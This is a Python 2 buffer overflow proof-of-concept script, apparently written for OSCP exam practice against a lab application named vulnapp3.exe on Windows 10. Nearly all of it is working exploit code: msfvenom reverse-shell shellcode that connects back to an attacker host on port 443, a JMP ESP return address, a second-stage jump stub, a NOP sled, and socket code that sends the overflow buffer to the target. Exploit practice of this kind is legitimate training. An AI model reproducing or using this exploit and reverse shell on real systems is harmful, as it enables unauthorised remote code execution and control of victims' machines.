#!/usr/bin/python
# Tested on: Windows 10 x86
# Author: dead1
# vulnapp3.exe

import socket

victim = "10.0.0.53"
port = 7003

## msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.45 LPORT=443 -f py -b '\x00\x3b\x45' -v shellcode
shellcode = b"\xda\xd2\xd9\x74\x24\xf4\x5e\xbf\xf9\x6f\xaf"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x83\xc6\x04\x31\x7e\x13"
shellcode += b"\x03\x87\x7c\x4d\xae\x8b\x6b\x13\x51\x73\x6c"
shellcode += b"\x74\xdb\x96\x5d\xb4\xbf\xd3\xce\x04\xcb\xb1"
shellcode += b"\xe2\xef\x99\x21\x70\x9d\x35\x46\x31\x28\x60"
shellcode += b"\x69\xc2\x01\x50\xe8\x40\x58\x85\xca\x79\x93"
shellcode += b"\xd8\x0b\xbd\xce\x11\x59\x16\x84\x84\x4d\x13"
shellcode += b"\xd0\x14\xe6\x6f\xf4\x1c\x1b\x27\xf7\x0d\x8a"
shellcode += b"\x33\xae\x8d\x2d\x97\xda\x87\x35\xf4\xe7\x5e"
shellcode += b"\xce\xce\x9c\x60\x06\x1f\x5c\xce\x67\xaf\xaf"
shellcode += b"\x0e\xa0\x08\x50\x65\xd8\x6a\xed\x7e\x1f\x10"
shellcode += b"\x29\x0a\xbb\xb2\xba\xac\x67\x42\x6e\x2a\xec"
shellcode += b"\x48\xdb\x38\xaa\x4c\xda\xed\xc1\x69\x57\x10"
shellcode += b"\x05\xf8\x23\x37\x81\xa0\xf0\x56\x90\x0c\x56"
shellcode += b"\x66\xc2\xee\x07\xc2\x89\x03\x53\x7f\xd0\x4b"
shellcode += b"\x90\xb2\xea\x8b\xbe\xc5\x99\xb9\x61\x7e\x35"
shellcode += b"\xf2\xea\x58\xc2\xf5\xc0\x1d\x5c\x08\xeb\x5d"
shellcode += b"\x75\xcf\xbf\x0d\xed\xe6\xbf\xc5\xed\x07\x6a"
shellcode += b"\x49\xbd\xa7\xc5\x2a\x6d\x08\xb6\xc2\x67\x87"
shellcode += b"\xe9\xf3\x88\x4d\x82\x9e\x73\x06\xa7\x5e\x7b"
shellcode += b"\xfb\xdf\x5c\x7b\x02\x9b\xe8\x9d\x6e\xcb\xbc"
shellcode += b"\x36\x07\x72\xe5\xcc\xb6\x7b\x33\xa9\xf9\xf0"
shellcode += b"\xb0\x4e\xb7\xf0\xbd\x5c\x20\xf1\x8b\x3e\xe7"
shellcode += b"\x0e\x26\x56\x6b\x9c\xad\xa6\xe2\xbd\x79\xf1"
shellcode += b"\xa3\x70\x70\x97\x59\x2a\x2a\x85\xa3\xaa\x15"
shellcode += b"\x0d\x78\x0f\x9b\x8c\x0d\x2b\xbf\x9e\xcb\xb4"
shellcode += b"\xfb\xca\x83\xe2\x55\xa4\x65\x5d\x14\x1e\x3c"
shellcode += b"\x32\xfe\xf6\xb9\x78\xc1\x80\xc5\x54\xb7\x6c"
shellcode += b"\x77\x01\x8e\x93\xb8\xc5\x06\xec\xa4\x75\xe8"
shellcode += b"\x27\x6d\x85\xa3\x65\xc4\x0e\x6a\xfc\x54\x53"
shellcode += b"\x8d\x2b\x9a\x6a\x0e\xd9\x63\x89\x0e\xa8\x66"
shellcode += b"\xd5\x88\x41\x1b\x46\x7d\x65\x88\x67\x54"

# 0x0BADF00D - Local
# 0x77067BB8 JMP ESP - Kernel32.dll
eip = "\xb8\x7b\x06\x77"

## sec stage
# 81C41CFEFFFF      add esp,0xfffffe1c
# FFE4              jmp esp
secstage = "\x90\x90\x81\xc4\x1c\xfe\xff\xff\x90\xff\xe4\x90"

## buffer conditions
fullbuff = 2228
eipoffset = 2080
numberofnops = 1500
nopsled = "\x90" * numberofnops
inibuff = "C" * (eipoffset - len(nopsled) - len(shellcode))
finbuff = "A" * (fullbuff - len(eip) - eipoffset - len(secstage))

## build the buffer string
thebuff = inibuff + nopsled + shellcode + eip + secstage + finbuff

print "[*] VulnApp3 Buffer Overflow POC OSCP.."
print "[*] Total Length of buffer: " + str(len(thebuff))
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((victim, port))
print "[*] Sending evil buffer..."
s.send(thebuff)
s.close()
print "[*] Done!"
